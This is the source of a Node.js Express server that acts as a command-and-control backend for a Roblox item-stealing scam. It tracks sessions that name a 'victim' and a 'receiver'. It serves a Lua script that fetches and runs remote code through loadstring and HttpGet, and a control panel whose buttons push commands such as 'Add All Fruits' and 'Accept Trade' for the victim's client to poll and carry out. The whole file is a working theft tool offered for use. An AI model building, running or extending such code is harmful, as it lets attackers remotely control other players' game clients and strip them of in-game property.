const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(express.json());

// Hardcoded keys (as requested)
const AUTH_KEY = "Ultrasecretkey";
const COMMAND_KEY = "Ultrasecretkey";

// In-memory storage
const sessions = new Map();
const commandQueue = new Map();

// Health check (required for Railway)
app.get('/', (req, res) => {
    res.json({ status: 'Roblox Control API', timestamp: new Date().toISOString() });
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', uptime: process.uptime() });
});

// Create session endpoint
app.post('/api/create-session', (req, res) => {
    const { victimUser, placeId, jobId, receiverUser, authKey } = req.body;
    
    if (authKey !== AUTH_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const sessionId = uuidv4();
    const session = {
        sessionId,
        victimUser,
        receiverUser: receiverUser || 'unknown',
        placeId,
        jobId,
        createdAt: Date.now(),
        commands: [],
        active: true
    };

    sessions.set(sessionId, session);
    
    const receiverKey = `${receiverUser}_${sessionId.slice(0, 8)}`;
    
    // Build public URL from request or use env fallback
    const publicUrl = process.env.PUBLIC_URL || `${req.protocol}://${req.get('host')}`;
    
    res.json({ 
        success: true, 
        sessionId,
        receiverKey,
        joinScriptUrl: `${publicUrl}/api/join-script/${sessionId}`,
        panelUrl: `${publicUrl}/api/panel/${sessionId}`
    });
});

// Get join script (returns Lua)
app.get('/api/join-script/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }

    const publicUrl = process.env.PUBLIC_URL || `${req.protocol}://${req.get('host')}`;

    const luaScript = `-- Join script for session ${sessionId}
getgenv().CONTROL_SESSION_ID = "${sessionId}"
getgenv().CONTROL_API_URL = "${publicUrl}"
getgenv().VICTIM_USER = "${session.victimUser}"
getgenv().RECEIVER_USER = "${session.receiverUser}"
loadstring(game:HttpGet("${publicUrl}/api/panel-code/${sessionId}"))()`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(luaScript);
});

// Get panel code (returns Lua UI code)
app.get('/api/panel-code/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);
    
    if (!session) {
        return res.status(404).send('-- Session not found');
    }

    const publicUrl = process.env.PUBLIC_URL || `${req.protocol}://${req.get('host')}`;

    const panelCode = `-- CONTROL PANEL FOR SESSION: ${sessionId}
-- Victim: ${session.victimUser} | Receiver: ${session.receiverUser}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local lp = Players.LocalPlayer
local API_URL = "${publicUrl}"
local SESSION_ID = "${sessionId}"
local COMMAND_KEY = "${COMMAND_KEY}"

-- Create UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AstryxControlPanel"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 320, 0, 450)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -225)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 8)
Corner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.Text = "ASTRYX CONTROL"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = Title

local Scroll = Instance.new("ScrollingFrame")
Scroll.Name = "CommandList"
Scroll.Size = UDim2.new(1, -20, 1, -100)
Scroll.Position = UDim2.new(0, 10, 0, 50)
Scroll.BackgroundTransparency = 1
Scroll.ScrollBarThickness = 4
Scroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
Scroll.Parent = MainFrame

local UIList = Instance.new("UIListLayout")
UIList.Padding = UDim.new(0, 8)
UIList.Parent = Scroll

-- Command definitions
local commands = {
    { name = "Add All Fruits", cmd = ".addallfruits", color = Color3.fromRGB(0, 150, 255) },
    { name = "Add All Premium", cmd = ".addallpre", color = Color3.fromRGB(255, 215, 0) },
    { name = "Accept Trade", cmd = ".accept", color = Color3.fromRGB(0, 255, 100) },
    { name = "Cancel Trade", cmd = ".cancel", color = Color3.fromRGB(255, 50, 50) },
    { name = "Clear All", cmd = ".clearall", color = Color3.fromRGB(255, 100, 100) },
    { name = "TP to Trade", cmd = ".tp", color = Color3.fromRGB(150, 0, 255) },
    { name = "Jump", cmd = ".jump", color = Color3.fromRGB(100, 100, 100) },
    { name = "Kick Victim", cmd = ".kick", color = Color3.fromRGB(200, 0, 0) },
}

-- Create buttons
for _, cmdInfo in ipairs(commands) do
    local btn = Instance.new("TextButton")
    btn.Name = cmdInfo.name
    btn.Size = UDim2.new(1, -10, 0, 40)
    btn.BackgroundColor3 = cmdInfo.color
    btn.Text = cmdInfo.name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 14
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = Scroll
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = cmdInfo.color:Lerp(Color3.new(1,1,1), 0.2)}):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = cmdInfo.color}):Play()
    end)
    
    btn.MouseButton1Click:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.1), {Size = UDim2.new(0.95, -10, 0, 38)}):Play()
        task.wait(0.1)
        TweenService:Create(btn, TweenInfo.new(0.1), {Size = UDim2.new(1, -10, 0, 40)}):Play()
        
        sendCommand(cmdInfo.cmd)
    end)
end

-- Status label
local Status = Instance.new("TextLabel")
Status.Name = "Status"
Status.Size = UDim2.new(1, -20, 0, 30)
Status.Position = UDim2.new(0, 10, 1, -40)
Status.BackgroundTransparency = 1
Status.Text = "● Connected"
Status.TextColor3 = Color3.fromRGB(0, 255, 100)
Status.TextSize = 12
Status.Font = Enum.Font.Gotham
Status.Parent = MainFrame

-- Make draggable
local dragging = false
local dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- Command sender
function sendCommand(cmd)
    local url = API_URL .. "/api/command/" .. SESSION_ID
    local payload = HttpService:JSONEncode({
        command = cmd,
        sender = lp.Name,
        timestamp = os.time()
    })
    
    pcall(function()
        local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request or httprequest or (fluxus and fluxus.request)
        
        local response = httpRequest({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
        
        if response and response.StatusCode == 200 then
            Status.Text = "● Sent: " .. cmd
            Status.TextColor3 = Color3.fromRGB(0, 255, 100)
        else
            Status.Text = "● Failed"
            Status.TextColor3 = Color3.fromRGB(255, 50, 50)
        end
    end)
    
    -- Also try chat as backup
    pcall(function()
        local tcs = game:GetService("TextChatService")
        local channels = tcs.TextChannels
        local ch = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("All")
        if ch then
            ch:SendAsync(cmd)
        end
    end)
    
    task.delay(2, function()
        Status.Text = "● Connected"
        Status.TextColor3 = Color3.fromRGB(0, 255, 100)
    end)
end

-- Initialize
ScreenGui.Parent = lp:WaitForChild("PlayerGui")
print("[ControlPanel] Loaded for session: " .. SESSION_ID)`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(panelCode);
});

// Receive command from panel
app.post('/api/command/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const { command, sender } = req.body;
    
    const session = sessions.get(sessionId);
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }

    const cmdData = {
        cmd: command,
        sender: sender,
        timestamp: Date.now(),
        id: uuidv4()
    };
    
    session.commands.push(cmdData);
    commandQueue.set(session.victimUser, cmdData);
    
    console.log(`[${sessionId}] Command: ${command} from ${sender}`);
    res.json({ success: true, commandId: cmdData.id });
});

// Victim polls for commands
app.get('/api/get-command', (req, res) => {
    const { user, key } = req.query;
    
    if (key !== COMMAND_KEY) {
        return res.status(401).json({ ok: false, error: 'Invalid key' });
    }

    const pending = commandQueue.get(user);
    if (pending && (Date.now() - pending.timestamp < 30000)) {
        commandQueue.delete(user);
        return res.json({ ok: true, cmd: pending.cmd, sender: pending.sender });
    }

    res.json({ ok: false, cmd: null });
});

// Session status
app.get('/api/status/:sessionId', (req, res) => {
    const session = sessions.get(req.params.sessionId);
    if (!session) return res.status(404).json({ error: 'Not found' });
    
    res.json({
        active: session.active,
        victim: session.victimUser,
        receiver: session.receiverUser,
        commandCount: session.commands.length,
        created: session.createdAt
    });
});

// Cleanup old sessions every 5 minutes
setInterval(() => {
    const now = Date.now();
    for (const [id, session] of sessions.entries()) {
        if (now - session.createdAt > 3600000) { // 1 hour
            sessions.delete(id);
            console.log(`Cleaned up session ${id}`);
        }
    }
}, 300000);

// CRITICAL: Use Railway's PORT and bind to 0.0.0.0
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Control API running on port ${PORT}`);
    console.log(`Auth/CMD Key: ${AUTH_KEY}`);
});
